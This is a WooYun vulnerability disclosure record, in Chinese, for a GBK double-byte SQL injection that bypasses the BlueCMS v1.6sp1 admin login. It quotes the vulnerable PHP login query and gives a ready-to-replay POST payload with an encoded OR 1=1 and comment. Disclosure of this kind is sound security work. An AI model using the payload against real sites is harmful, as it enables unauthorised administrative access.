{"id": 11816, "wybug_id": "wooyun-2013-021082", "wybug_title": "bluecms最新版本双字节万能密码进后台", "wybug_corp": "BLUECMS", "wybug_author": "小贱人", "wybug_date": "2013-04-01 17:13", "wybug_open_date": "2013-06-30 17:14", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["万能密码", "双字节"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-04-01：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-06-30：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述：  bluecms最新版本即v1.6sp1,处理登录验证时对变量进行单引号转义，但可以用gbk 双字节编码闭合单引号再注释从而进入后台 详细说明：  bluecms验证登录代码如下\nfunction check_admin($name, $pwd){\tglobal $db;\t$row = $db->getone(\"SELECT COUNT(*) AS num FROM \".table('admin').\" WHERE admin_name='$name' and pwd = md5('$pwd')\"); \tif($row['num'] > 0) \t{ \t\treturn true; \t} \telse \t{ \t\treturn false; \t}}\n且变量进入check_admin函数前已被转义一次，无论MAGIC魔术棒是否开启\nif(!get_magic_quotes_gpc()) { \t$_POST = deep_addslashes($_POST); \t$_GET = deep_addslashes($_GET); \t$_COOKIES = deep_addslashes($_COOKIES);\n但问题出在这句上\nif($this->dbversion() > '4.1'){    \t\t\tmysql_query( \"SET NAMES gbk\");    \t\t\tif($this->dbversion() > '5.0.1'){    \t\t\t\tmysql_query(\"SET sql_mode = ''\",$this->linkid);    \t\t\t}\n邪恶地笑了打开后台登录，并准备抓包用户名和密码随便输 比如jianren  jianren抓到的post变量为 admin_name=jianren&admin_pwd=jianren&submit=%B5%C7%C2%BC&act=do_login修改为admin_name=jianren%d5%27%20or%201%3d1%23&admin_pwd=jianren&submit=%B5%C7%C2%BC&act=do_login   漏洞证明：  然后重放 芝麻开门\n\n   修复方案：  你们比我懂   版权声明：转载请注明来源 小贱人@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}